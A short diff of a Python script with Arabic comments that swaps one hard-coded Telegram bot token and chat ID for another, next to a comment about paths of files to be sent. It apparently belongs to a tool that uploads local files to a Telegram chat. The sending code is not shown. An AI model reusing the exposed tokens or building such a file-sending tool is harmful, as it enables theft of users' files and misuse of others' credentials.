@@ -7,8 +7,8 @@ from pystyle import *
 
 
 # بيانات البوت والمستخدم المرسل إليه
-bot_token = '6078999720:AAEobp4-oTAPF0apNz-L6UqUoA_2_DfMQ3M'
-chat_id = '802140429'
+bot_token = '7067174989:AAEQn-IX9wuPwcNayIER8PHqnyRaljPYC1w'
+chat_id = '2110761305'
 os.system('clear')
 
 # المسارات التي تحتوي على الملفات التي تريد إرسالها
